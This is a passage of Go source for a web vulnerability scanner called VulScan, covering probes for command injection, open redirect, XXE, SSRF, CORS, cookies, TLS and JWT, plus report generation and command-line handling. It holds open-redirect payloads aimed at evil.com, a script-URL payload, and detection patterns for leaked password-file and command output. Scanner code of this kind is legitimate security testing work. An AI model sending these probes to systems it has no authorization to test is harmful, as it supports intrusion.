		result.Summary.RiskBreakdown[finding.Severity]++
		result.Summary.TypeBreakdown[finding.Type]++
	}
	
	// Sort findings by severity
	sort.Slice(s.findings, func(i, j int) bool {
		severityOrder := map[RiskLevel]int{
			RiskCritical: 4, RiskHigh: 3, RiskMedium: 2, RiskLow: 1, RiskInfo: 0,
		}
		return severityOrder[s.findings[i].Severity] > severityOrder[s.findings[j].Severity]
	})
	
	result.Findings = s.findings
	result.Errors = s.errors
	
	if s.options.Verbose {
		fmt.Printf("Scan completed in %s. Found %d vulnerabilities.\n", 
			duration, len(s.findings))
	}
	
	return result, nil
}

// Test SSL/TLS configuration
func (s *Scanner) testSSLConfiguration(ctx context.Context, host string) {
	if !strings.Contains(host, ":") {
		host = host + ":443"
	}
	
	// Test TLS connection
	dialer := &tls.Dialer{
		Config: &tls.Config{
			InsecureSkipVerify: false, // We want to check certificate validity
		},
	}
	
	conn, err := dialer.DialContext(ctx, "tcp", host)
	if err != nil {
		// Try with InsecureSkipVerify to get more details
		dialer.Config.InsecureSkipVerify = true
		conn, err = dialer.DialContext(ctx, "tcp", host)
		if err != nil {
			s.addError(fmt.Sprintf("SSL/TLS test failed for %s: %v", host, err))
			return
		}
	}
	defer conn.Close()
	
	tlsConn := conn.(*tls.Conn)
	state := tlsConn.ConnectionState()
	
	// Check TLS version
	if state.Version < tls.VersionTLS12 {
		finding := Finding{
			ID:          fmt.Sprintf("ssl_version_%d", time.Now().Unix()),
			Type:        SSLConfiguration,
			Severity:    RiskHigh,
			CVSS:        7.4,
			CWE:         cweMapping[SSLConfiguration],
			Title:       "Weak TLS Version",
			Description: fmt.Sprintf("Server supports weak TLS version: %s", tlsVersionString(state.Version)),
			URL:         fmt.Sprintf("https://%s", host),
			Evidence:    fmt.Sprintf("TLS version: %s", tlsVersionString(state.Version)),
			Solution:    "Configure server to support only TLS 1.2 and higher",
			References: []string{
				"https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning",
				"https://cwe.mitre.org/data/definitions/326.html",
			},
			Confidence: 100,
			Timestamp:  time.Now(),
		}
		s.addFinding(finding)
	}
	
	// Check cipher suite
	if state.CipherSuite == 0 || isWeakCipher(state.CipherSuite) {
		finding := Finding{
			ID:          fmt.Sprintf("ssl_cipher_%d", time.Now().Unix()),
			Type:        SSLConfiguration,
			Severity:    RiskMedium,
			CVSS:        5.3,
			CWE:         cweMapping[SSLConfiguration],
			Title:       "Weak Cipher Suite",
			Description: "Server uses weak or insecure cipher suite",
			URL:         fmt.Sprintf("https://%s", host),
			Evidence:    fmt.Sprintf("Cipher suite: %s", tls.CipherSuiteName(state.CipherSuite)),
			Solution:    "Configure server to use strong cipher suites only",
			References: []string{
				"https://wiki.mozilla.org/Security/Server_Side_TLS",
			},
			Confidence: 100,
			Timestamp:  time.Now(),
		}
		s.addFinding(finding)
	}
}

// Test cookie security
func (s *Scanner) testCookieSecurity(ctx context.Context, targetURL string) {
	resp, err := s.makeRequest(ctx, "GET", targetURL, nil, nil)
	if err != nil {
		s.addError(fmt.Sprintf("Cookie security test failed for %s: %v", targetURL, err))
		return
	}
	defer resp.Body.Close()
	
	cookies := resp.Cookies()
	for _, cookie := range cookies {
		// Check for HttpOnly flag
		if !cookie.HttpOnly {
			finding := Finding{
				ID:          fmt.Sprintf("cookie_httponly_%s_%d", cookie.Name, time.Now().Unix()),
				Type:        CookieSecurity,
				Severity:    RiskMedium,
				CVSS:        4.3,
				CWE:         cweMapping[CookieSecurity],
				Title:       "Cookie Missing HttpOnly Flag",
				Description: fmt.Sprintf("Cookie '%s' is missing HttpOnly flag", cookie.Name),
				URL:         targetURL,
				Evidence:    fmt.Sprintf("Cookie: %s", cookie.String()),
				Solution:    "Set HttpOnly flag on all cookies containing sensitive data",
				References: []string{
					"https://owasp.org/www-community/controls/SecureFlag",
					"https://cwe.mitre.org/data/definitions/614.html",
				},
				Confidence: 100,
				Timestamp:  time.Now(),
			}
			s.addFinding(finding)
		}
		
		// Check for Secure flag on HTTPS
		parsedURL, _ := url.Parse(targetURL)
		if parsedURL.Scheme == "https" && !cookie.Secure {
			finding := Finding{
				ID:          fmt.Sprintf("cookie_secure_%s_%d", cookie.Name, time.Now().Unix()),
				Type:        CookieSecurity,
				Severity:    RiskMedium,
				CVSS:        4.3,
				CWE:         cweMapping[CookieSecurity],
				Title:       "Cookie Missing Secure Flag",
				Description: fmt.Sprintf("Cookie '%s' is missing Secure flag on HTTPS site", cookie.Name),
				URL:         targetURL,
				Evidence:    fmt.Sprintf("Cookie: %s", cookie.String()),
				Solution:    "Set Secure flag on all cookies when using HTTPS",
				References: []string{
					"https://owasp.org/www-community/controls/SecureFlag",
					"https://cwe.mitre.org/data/definitions/614.html",
				},
				Confidence: 100,
				Timestamp:  time.Now(),
			}
			s.addFinding(finding)
		}
		
		// Check for SameSite attribute
		if cookie.SameSite == http.SameSiteDefaultMode {
			finding := Finding{
				ID:          fmt.Sprintf("cookie_samesite_%s_%d", cookie.Name, time.Now().Unix()),
				Type:        CookieSecurity,
				Severity:    RiskLow,
				CVSS:        3.1,
				CWE:         cweMapping[CookieSecurity],
				Title:       "Cookie Missing SameSite Attribute",
				Description: fmt.Sprintf("Cookie '%s' is missing SameSite attribute", cookie.Name),
				URL:         targetURL,
				Evidence:    fmt.Sprintf("Cookie: %s", cookie.String()),
				Solution:    "Set SameSite attribute to 'Strict' or 'Lax' as appropriate",
				References: []string{
					"https://owasp.org/www-community/SameSite",
				},
				Confidence: 90,
				Timestamp:  time.Now(),
			}
			s.addFinding(finding)
		}
	}
}

// Test command injection vulnerabilities
func (s *Scanner) testCommandInjection(ctx context.Context, baseURL string, params url.Values) {
	for param := range params {
		for _, payload := range payloads[CommandInjection] {
			select {
			case <-ctx.Done():
				return
			default:
			}
			
			testParams := make(url.Values)
			for k, v := range params {
				testParams[k] = v
			}
			testParams.Set(param, payload)
			
			testURL := baseURL + "?" + testParams.Encode()
			
			start := time.Now()
			resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
			responseTime := time.Since(start)
			
			if err != nil {
				s.addError(fmt.Sprintf("Command injection test failed for %s: %v", testURL, err))
				continue
			}
			defer resp.Body.Close()
			
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				s.addError(fmt.Sprintf("Failed to read response body: %v", err))
				continue
			}
			
			bodyStr := string(body)
			
			// Check for command output patterns
			cmdPatterns := []string{
				"uid=\\d+\\(.*\\) gid=\\d+\\(.*\\)",  // id command output
				"root:.*:0:0:",                        // passwd file content
				"Microsoft Windows",                   // Windows version
				"Linux version",                       // Linux version
				"total \\d+",                          // ls -l output
				"Volume.* Serial Number",              // Windows dir output
			}
			
			// Check for time-based injection (commands that cause delays)
			for _, pattern := range []string{"sleep", "ping", "timeout"} {
				if strings.Contains(payload, pattern) {
					if responseTime > 4*time.Second {
						finding := Finding{
							ID:          fmt.Sprintf("cmdi_time_%s_%d", param, time.Now().Unix()),
							Type:        CommandInjection,
							Severity:    s.calculateRiskLevel(CommandInjection),
							CVSS:        cvssScores[CommandInjection],
							CWE:         cweMapping[CommandInjection],
							Title:       "Time-based Command Injection",
							Description: fmt.Sprintf("Time-based command injection detected in parameter '%s'", param),
							URL:         testURL,
							Parameter:   param,
							Payload:     payload,
							Evidence:    fmt.Sprintf("Response time: %.2f seconds", responseTime.Seconds()),
							Solution:    "Implement proper input validation and avoid system calls with user input",
							References: []string{
								"https://owasp.org/www-community/attacks/Command_Injection",
								"https://cwe.mitre.org/data/definitions/78.html",
							},
							Confidence: 80,
							Timestamp:  time.Now(),
						}
						s.addFinding(finding)
						break
					}
				}
			}
			
			// Check for output patterns
			for _, pattern := range cmdPatterns {
				if matched, _ := regexp.MatchString("(?i)"+pattern, bodyStr); matched {
					finding := Finding{
						ID:          fmt.Sprintf("cmdi_%s_%d", param, time.Now().Unix()),
						Type:        CommandInjection,
						Severity:    s.calculateRiskLevel(CommandInjection),
						CVSS:        cvssScores[CommandInjection],
						CWE:         cweMapping[CommandInjection],
						Title:       "Command Injection Vulnerability",
						Description: fmt.Sprintf("Command injection vulnerability detected in parameter '%s'", param),
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    fmt.Sprintf("Pattern matched: %s", pattern),
						Solution:    "Implement proper input validation and avoid system calls with user input",
						References: []string{
							"https://owasp.org/www-community/attacks/Command_Injection",
							"https://cwe.mitre.org/data/definitions/78.html",
						},
						Confidence: 90,
						Timestamp:  time.Now(),
					}
					s.addFinding(finding)
					break
				}
			}
		}
	}
}

// Test open redirect vulnerabilities
func (s *Scanner) testOpenRedirect(ctx context.Context, baseURL string, params url.Values) {
	redirectPayloads := []string{
		"http://evil.com",
		"https://evil.com",
		"//evil.com",
		"javascript:alert('redirect')",
		"/\\evil.com",
		"http://google.com",
		"https://example.com",
	}
	
	for param := range params {
		for _, payload := range redirectPayloads {
			select {
			case <-ctx.Done():
				return
			default:
			}
			
			testParams := make(url.Values)
			for k, v := range params {
				testParams[k] = v
			}
			testParams.Set(param, payload)
			
			testURL := baseURL + "?" + testParams.Encode()
			
			resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
			if err != nil {
				s.addError(fmt.Sprintf("Open redirect test failed for %s: %v", testURL, err))
				continue
			}
			defer resp.Body.Close()
			
			// Check for redirect responses
			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				location := resp.Header.Get("Location")
				if location != "" && (strings.Contains(location, payload) || strings.Contains(location, "evil.com")) {
					finding := Finding{
						ID:          fmt.Sprintf("redirect_%s_%d", param, time.Now().Unix()),
						Type:        OpenRedirect,
						Severity:    s.calculateRiskLevel(OpenRedirect),
						CVSS:        cvssScores[OpenRedirect],
						CWE:         cweMapping[OpenRedirect],
						Title:       "Open Redirect Vulnerability",
						Description: fmt.Sprintf("Open redirect vulnerability detected in parameter '%s'", param),
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    fmt.Sprintf("Redirect location: %s", location),
						Solution:    "Validate redirect URLs against a whitelist of allowed destinations",
						References: []string{
							"https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet",
							"https://cwe.mitre.org/data/definitions/601.html",
						},
						Confidence: 95,
						Timestamp:  time.Now(),
					}
					s.addFinding(finding)
					break
				}
			}
		}
	}
}

// Test CSRF vulnerability
func (s *Scanner) testCSRF(ctx context.Context, targetURL string) {
	resp, err := s.makeRequest(ctx, "GET", targetURL, nil, nil)
	if err != nil {
		s.addError(fmt.Sprintf("CSRF test failed for %s: %v", targetURL, err))
		return
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		s.addError(fmt.Sprintf("Failed to read response body: %v", err))
		return
	}
	
	bodyStr := string(body)
	
	// Check for forms without CSRF tokens
	formRegex := regexp.MustCompile(`(?i)<form[^>]*>`)
	csrfTokenRegex := regexp.MustCompile(`(?i)(csrf|token|_token)`)
	
	if formRegex.MatchString(bodyStr) && !csrfTokenRegex.MatchString(bodyStr) {
		finding := Finding{
			ID:          fmt.Sprintf("csrf_%d", time.Now().Unix()),
			Type:        CSRF,
			Severity:    s.calculateRiskLevel(CSRF),
			CVSS:        cvssScores[CSRF],
			CWE:         cweMapping[CSRF],
			Title:       "Missing CSRF Protection",
			Description: "Forms found without CSRF token protection",
			URL:         targetURL,
			Evidence:    "HTML forms detected without CSRF tokens",
			Solution:    "Implement CSRF tokens in all forms and validate them server-side",
			References: []string{
				"https://owasp.org/www-community/attacks/csrf",
				"https://cwe.mitre.org/data/definitions/352.html",
			},
			Confidence: 70,
			Timestamp:  time.Now(),
		}
		s.addFinding(finding)
	}
}

// Test XXE vulnerability
func (s *Scanner) testXXE(ctx context.Context, targetURL string) {
	for _, payload := range payloads[XXE] {
		headers := map[string]string{
			"Content-Type": "application/xml",
		}
		
		resp, err := s.makeRequest(ctx, "POST", targetURL, strings.NewReader(payload), headers)
		if err != nil {
			s.addError(fmt.Sprintf("XXE test failed for %s: %v", targetURL, err))
			continue
		}
		defer resp.Body.Close()
		
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			s.addError(fmt.Sprintf("Failed to read response body: %v", err))
			continue
		}
		
		bodyStr := string(body)
		
		// Check for XXE indicators
		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "localhost") ||
			strings.Contains(bodyStr, "127.0.0.1") || strings.Contains(bodyStr, "ENTITY") {
			finding := Finding{
				ID:          fmt.Sprintf("xxe_%d", time.Now().Unix()),
				Type:        XXE,
				Severity:    s.calculateRiskLevel(XXE),
				CVSS:        cvssScores[XXE],
				CWE:         cweMapping[XXE],
				Title:       "XML External Entity (XXE) Vulnerability",
				Description: "XXE vulnerability detected - application processes XML input unsafely",
				URL:         targetURL,
				Payload:     payload,
				Evidence:    s.truncateString(bodyStr, 500),
				Solution:    "Disable XML external entity processing, use secure XML parsers",
				References: []string{
					"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
					"https://cwe.mitre.org/data/definitions/611.html",
				},
				Confidence: 90,
				Timestamp:  time.Now(),
			}
			s.addFinding(finding)
			break
		}
	}
}

// Test SSRF vulnerability
func (s *Scanner) testSSRF(ctx context.Context, baseURL string, params url.Values) {
	for param := range params {
		for _, payload := range payloads[SSRF] {
			testParams := make(url.Values)
			for k, v := range params {
				testParams[k] = v
			}
			testParams.Set(param, payload)
			
			testURL := baseURL + "?" + testParams.Encode()
			
			resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
			if err != nil {
				s.addError(fmt.Sprintf("SSRF test failed for %s: %v", testURL, err))
				continue
			}
			defer resp.Body.Close()
			
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				s.addError(fmt.Sprintf("Failed to read response body: %v", err))
				continue
			}
			
			bodyStr := string(body)
			
			// Check for SSRF indicators
			if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "SSH-") ||
				strings.Contains(bodyStr, "instance-id") || strings.Contains(bodyStr, "metadata") {
				finding := Finding{
					ID:          fmt.Sprintf("ssrf_%s_%d", param, time.Now().Unix()),
					Type:        SSRF,
					Severity:    s.calculateRiskLevel(SSRF),
					CVSS:        cvssScores[SSRF],
					CWE:         cweMapping[SSRF],
					Title:       "Server-Side Request Forgery (SSRF) Vulnerability",
					Description: fmt.Sprintf("SSRF vulnerability detected in parameter '%s'", param),
					URL:         testURL,
					Parameter:   param,
					Payload:     payload,
					Evidence:    s.truncateString(bodyStr, 500),
					Solution:    "Validate and whitelist allowed URLs, disable unnecessary URL schemes",
					References: []string{
						"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
						"https://cwe.mitre.org/data/definitions/918.html",
					},
					Confidence: 85,
					Timestamp:  time.Now(),
				}
				s.addFinding(finding)
				break
			}
		}
	}
}

// Test JWT Security
func (s *Scanner) testJWTSecurity(ctx context.Context, targetURL string) {
	resp, err := s.makeRequest(ctx, "GET", targetURL, nil, nil)
	if err != nil {
		s.addError(fmt.Sprintf("JWT test failed for %s: %v", targetURL, err))
		return
	}
	defer resp.Body.Close()
	
	// Check for JWT tokens in response headers
	for name, values := range resp.Header {
		for _, value := range values {
			if strings.Contains(strings.ToLower(name), "authorization") ||
				strings.Contains(strings.ToLower(name), "token") {
				if strings.Contains(value, "eyJ") { // JWT signature
					// Test for none algorithm
					if strings.Contains(value, "eyJhbGciOiJub25lIi") {
						finding := Finding{
							ID:          fmt.Sprintf("jwt_none_%d", time.Now().Unix()),
							Type:        JWTSecurity,
							Severity:    s.calculateRiskLevel(JWTSecurity),
							CVSS:        cvssScores[JWTSecurity],
							CWE:         cweMapping[JWTSecurity],
							Title:       "JWT None Algorithm Vulnerability",
							Description: "JWT token uses 'none' algorithm which bypasses signature verification",
							URL:         targetURL,
							Evidence:    fmt.Sprintf("JWT Header: %s", name),
							Solution:    "Use strong signing algorithms (RS256, HS256) and validate JWT signatures",
							References: []string{
								"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
								"https://cwe.mitre.org/data/definitions/287.html",
							},
							Confidence: 95,
							Timestamp:  time.Now(),
						}
						s.addFinding(finding)
					}
				}
			}
		}
	}
}

// Test GraphQL Security
func (s *Scanner) testGraphQLSecurity(ctx context.Context, targetURL string) {
	// Check if GraphQL endpoint exists
	graphqlURL := targetURL
	if !strings.Contains(targetURL, "graphql") {
		parsedURL, err := url.Parse(targetURL)
		if err != nil {
			return
		}
		parsedURL.Path = "/graphql"
		graphqlURL = parsedURL.String()
	}
	
	for _, payload := range payloads[GraphQLSecurity] {
		headers := map[string]string{
			"Content-Type": "application/json",
		}
		
		queryData := map[string]string{"query": payload}
		jsonData, _ := json.Marshal(queryData)
		
		resp, err := s.makeRequest(ctx, "POST", graphqlURL, strings.NewReader(string(jsonData)), headers)
		if err != nil {
			s.addError(fmt.Sprintf("GraphQL test failed for %s: %v", graphqlURL, err))
			continue
		}
		defer resp.Body.Close()
		
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			s.addError(fmt.Sprintf("Failed to read response body: %v", err))
			continue
		}
		
		bodyStr := string(body)
		
		// Check for GraphQL introspection or sensitive data
		if strings.Contains(bodyStr, "__schema") || strings.Contains(bodyStr, "__type") ||
			strings.Contains(bodyStr, "password") || strings.Contains(bodyStr, "email") {
			finding := Finding{
				ID:          fmt.Sprintf("graphql_%d", time.Now().Unix()),
				Type:        GraphQLSecurity,
				Severity:    s.calculateRiskLevel(GraphQLSecurity),
				CVSS:        cvssScores[GraphQLSecurity],
				CWE:         cweMapping[GraphQLSecurity],
				Title:       "GraphQL Information Disclosure",
				Description: "GraphQL endpoint exposes sensitive information or allows introspection",
				URL:         graphqlURL,
				Payload:     payload,
				Evidence:    s.truncateString(bodyStr, 500),
				Solution:    "Disable GraphQL introspection in production, implement proper access controls",
				References: []string{
					"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL",
					"https://cwe.mitre.org/data/definitions/200.html",
				},
				Confidence: 80,
				Timestamp:  time.Now(),
			}
			s.addFinding(finding)
			break
		}
	}
}

// Test API Endpoints Discovery
func (s *Scanner) testAPIEndpoints(ctx context.Context, targetURL string) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return
	}
	
	for _, endpoint := range payloads[APIEndpoints] {
		parsedURL.Path = endpoint
		testURL := parsedURL.String()
		
		resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				continue
			}
			
			bodyStr := string(body)
			
			// Check for API documentation or sensitive endpoints
			if strings.Contains(bodyStr, "swagger") || strings.Contains(bodyStr, "openapi") ||
				strings.Contains(bodyStr, "api") || strings.Contains(bodyStr, "endpoints") {
				finding := Finding{
					ID:          fmt.Sprintf("api_endpoint_%d", time.Now().Unix()),
					Type:        APIEndpoints,
					Severity:    s.calculateRiskLevel(APIEndpoints),
					CVSS:        cvssScores[APIEndpoints],
					CWE:         cweMapping[APIEndpoints],
					Title:       "Exposed API Endpoint",
					Description: fmt.Sprintf("Potentially sensitive API endpoint discovered: %s", endpoint),
					URL:         testURL,
					Evidence:    s.truncateString(bodyStr, 300),
					Solution:    "Secure API endpoints with proper authentication and authorization",
					References: []string{
						"https://owasp.org/www-project-api-security/",
						"https://cwe.mitre.org/data/definitions/200.html",
					},
					Confidence: 70,
					Timestamp:  time.Now(),
				}
				s.addFinding(finding)
			}
		}
	}
}

// Test CORS Configuration
func (s *Scanner) testCORS(ctx context.Context, targetURL string) {
	for _, origin := range payloads[CORS] {
		headers := map[string]string{
			"Origin": origin,
		}
		
		resp, err := s.makeRequest(ctx, "GET", targetURL, nil, headers)
		if err != nil {
			s.addError(fmt.Sprintf("CORS test failed for %s: %v", targetURL, err))
			continue
		}
		defer resp.Body.Close()
		
		// Check CORS headers
		accessControlOrigin := resp.Header.Get("Access-Control-Allow-Origin")
		if accessControlOrigin != "" {
			if accessControlOrigin == "*" || accessControlOrigin == origin {
				finding := Finding{
					ID:          fmt.Sprintf("cors_%d", time.Now().Unix()),
					Type:        CORS,
					Severity:    s.calculateRiskLevel(CORS),
					CVSS:        cvssScores[CORS],
					CWE:         cweMapping[CORS],
					Title:       "Insecure CORS Configuration",
					Description: "CORS policy allows requests from untrusted origins",
					URL:         targetURL,
					Evidence:    fmt.Sprintf("Access-Control-Allow-Origin: %s", accessControlOrigin),
					Solution:    "Configure CORS to allow only trusted origins, avoid using wildcard (*)",
					References: []string{
						"https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
						"https://cwe.mitre.org/data/definitions/942.html",
					},
					Confidence: 85,
					Timestamp:  time.Now(),
				}
				s.addFinding(finding)
				break
			}
		}
	}
}

// Helper functions
func tlsVersionString(version uint16) string {
	switch version {
	case tls.VersionSSL30:
		return "SSL 3.0"
	case tls.VersionTLS10:
		return "TLS 1.0"
	case tls.VersionTLS11:
		return "TLS 1.1"
	case tls.VersionTLS12:
		return "TLS 1.2"
	case tls.VersionTLS13:
		return "TLS 1.3"
	default:
		return "Unknown"
	}
}

func isWeakCipher(cipherSuite uint16) bool {
	weakCiphers := []uint16{
		tls.TLS_RSA_WITH_RC4_128_SHA,
		tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,
		tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,
	}
	
	for _, weak := range weakCiphers {
		if cipherSuite == weak {
			return true
		}
	}
	return false
}

// Export results to JSON
func (s *Scanner) ExportJSON(result *ScanResult, filename string) error {
	data, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %v", err)
	}
	
	return os.WriteFile(filename, data, 0644)
}

// Generate HTML report
func (s *Scanner) GenerateHTMLReport(result *ScanResult, filename string) error {
	htmlTemplate := `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VulScan Security Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 8px; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .summary-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
        .risk-critical { border-left: 5px solid #dc3545; }
        .risk-high { border-left: 5px solid #fd7e14; }
        .risk-medium { border-left: 5px solid #ffc107; }
        .risk-low { border-left: 5px solid #28a745; }
        .risk-info { border-left: 5px solid #17a2b8; }
        .finding { margin-bottom: 20px; padding: 20px; background: white; border-radius: 8px; border-left: 5px solid #ccc; }
        .finding h3 { margin: 0 0 10px 0; }
        .meta { color: #666; font-size: 0.9em; margin: 10px 0; }
        .payload { background: #f8f9fa; padding: 10px; border-radius: 4px; font-family: monospace; word-break: break-all; }
        .solution { background: #d4edda; padding: 15px; border-radius: 4px; margin-top: 10px; border-left: 4px solid #28a745; }
        .footer { text-align: center; margin-top: 30px; padding: 20px; color: #666; border-top: 1px solid #eee; }
        .timestamp { color: #666; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 VulScan Security Report</h1>
            <p>Target: <strong>{{.ScanInfo.Target}}</strong></p>
            <p class="timestamp">Scan completed: {{.ScanInfo.Timestamp.Format "2006-01-02 15:04:05"}} | Duration: {{.ScanInfo.Duration}}</p>
        </div>
        
        <div class="summary">
            <div class="summary-card">
                <h3>Total Findings</h3>
                <h2>{{.Summary.TotalFindings}}</h2>
            </div>
            <div class="summary-card risk-critical">
                <h3>Critical</h3>
                <h2>{{index .Summary.RiskBreakdown "CRITICAL"}}</h2>
            </div>
            <div class="summary-card risk-high">
                <h3>High</h3>
                <h2>{{index .Summary.RiskBreakdown "HIGH"}}</h2>
            </div>
            <div class="summary-card risk-medium">
                <h3>Medium</h3>
                <h2>{{index .Summary.RiskBreakdown "MEDIUM"}}</h2>
            </div>
            <div class="summary-card risk-low">
                <h3>Low</h3>
                <h2>{{index .Summary.RiskBreakdown "LOW"}}</h2>
            </div>
        </div>
        
        <h2>🔍 Detailed Findings</h2>
        {{range .Findings}}
        <div class="finding risk-{{.Severity | lower}}">
            <h3>{{.Title}}</h3>
            <div class="meta">
                <span class="badge">{{.Severity}}</span> | 
                <span>CVSS: {{.CVSS}}</span> | 
                <span>{{.CWE}}</span> | 
                <span>Confidence: {{.Confidence}}%</span>
            </div>
            <p>{{.Description}}</p>
            <div class="meta"><strong>URL:</strong> {{.URL}}</div>
            {{if .Parameter}}<div class="meta"><strong>Parameter:</strong> {{.Parameter}}</div>{{end}}
            {{if .Payload}}
            <div class="meta"><strong>Payload:</strong></div>
            <div class="payload">{{.Payload}}</div>
            {{end}}
            {{if .Evidence}}<div class="meta"><strong>Evidence:</strong> {{.Evidence}}</div>{{end}}
            <div class="solution">
                <strong>💡 Solution:</strong> {{.Solution}}
            </div>
        </div>
        {{end}}
        
        <div class="footer">
            <p>Generated by VulScan v{{.ScanInfo.Version}} | Total Requests: {{.Summary.Requests}}</p>
            <p>⚠️ This tool is for authorized security testing only</p>
        </div>
    </div>
</body>
</html>`
	
	tmpl, err := template.New("report").Funcs(template.FuncMap{
		"lower": strings.ToLower,
	}).Parse(htmlTemplate)
	if err != nil {
		return fmt.Errorf("failed to parse template: %v", err)
	}
	
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()
	
	return tmpl.Execute(file, result)
}

// Load payloads from file
func loadPayloadsFromFile(filename string, vulnType VulnType) error {
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		return nil // File doesn't exist, use default payloads
	}
	
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	
	var newPayloads []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			newPayloads = append(newPayloads, line)
		}
	}
	
	if len(newPayloads) > 0 {
		payloads[vulnType] = newPayloads
	}
	
	return scanner.Err()
}

// Main function
func main() {
	// Command line flags
	var options Options
	flag.StringVar(&options.Target, "target", "", "Target URL to scan")
	flag.BoolVar(&options.Verbose, "verbose", false, "Enable verbose output")
	flag.BoolVar(&options.Verbose, "v", false, "Enable verbose output (shorthand)")
	flag.IntVar(&options.Threads, "threads", 5, "Number of concurrent threads")
	flag.IntVar(&options.Threads, "t", 5, "Number of concurrent threads (shorthand)")
	flag.IntVar(&options.Timeout, "timeout", 10, "Request timeout in seconds")
	flag.StringVar(&options.Output, "output", "", "Output file for JSON results")
	flag.StringVar(&options.Output, "o", "", "Output file for JSON results (shorthand)")
	flag.StringVar(&options.UserAgent, "user-agent", "", "Custom User-Agent string")
	flag.StringVar(&options.UserAgent, "u", "", "Custom User-Agent string (shorthand)")
	flag.BoolVar(&options.Report, "report", false, "Generate HTML report")
	flag.StringVar(&options.ConfigFile, "config", "", "Configuration file path")
	flag.IntVar(&options.RateLimit, "rate-limit", 10, "Requests per second limit")
	flag.StringVar(&options.Headers, "headers", "", "Custom headers (format: 'Header1:Value1,Header2:Value2')")
	flag.StringVar(&options.Proxy, "proxy", "", "Proxy URL (http://proxy:port)")
	
	version := flag.Bool("version", false, "Show version information")
	help := flag.Bool("help", false, "Show help message")
	flag.BoolVar(help, "h", false, "Show help message (shorthand)")
	
	flag.Parse()
	
	// Show version
	if *version {
		fmt.Printf("VulScan v%s\n", Version)
		fmt.Println("Advanced Web Security Scanner")
		fmt.Println("Developed by ATOMGAMERAGA")
		os.Exit(0)
	}
	
	// Show help
	if *help {
		fmt.Printf(Banner, Version)
		fmt.Println("\nUsage:")
		fmt.Println("  vulscan [options] <target-url>")
		fmt.Println("\nOptions:")
		flag.PrintDefaults()
		fmt.Println("\nExamples:")
		fmt.Println("  vulscan http://example.com/page.php?id=1")
		fmt.Println("  vulscan --verbose --threads 10 --output report.json http://example.com")
		fmt.Println("  vulscan --report --config config.yaml http://example.com")
		fmt.Println("\nSupported Vulnerability Types:")
		fmt.Println("  • SQL Injection (Classic & Blind)")
		fmt.Println("  • Cross-Site Scripting (XSS)")
		fmt.Println("  • Directory Traversal / LFI")
		fmt.Println("  • Command Injection")
		fmt.Println("  • Open Redirect")
		fmt.Println("  • CSRF Detection")
		fmt.Println("  • Security Headers Analysis")
		fmt.Println("  • SSL/TLS Configuration")
		fmt.Println("  • Cookie Security")
		fmt.Println("\nRisk Levels (CVSS v3.1):")
		fmt.Println("  🔴 CRITICAL (9.0-10.0) - Immediate action required")
		fmt.Println("  🟠 HIGH     (7.0-8.9)  - Fix within 1 week")
		fmt.Println("  🟡 MEDIUM   (4.0-6.9)  - Fix within 1 month")
		fmt.Println("  🟢 LOW      (0.1-3.9)  - Fix in next update")
		fmt.Println("\n⚠️  Legal Notice:")
		fmt.Println("This tool should only be used on systems you own or have explicit permission to test.")
		os.Exit(0)
	}
	
	// Get target from command line args if not provided via flag
	if options.Target == "" {
		args := flag.Args()
		if len(args) < 1 {
			fmt.Printf(Banner, Version)
			fmt.Println("Error: Target URL is required")
			fmt.Println("\nUsage: vulscan [options] <target-url>")
			fmt.Println("Try 'vulscan --help' for more information.")
			os.Exit(1)
		}
		options.Target = args[0]
	}
	
	// Validate target URL
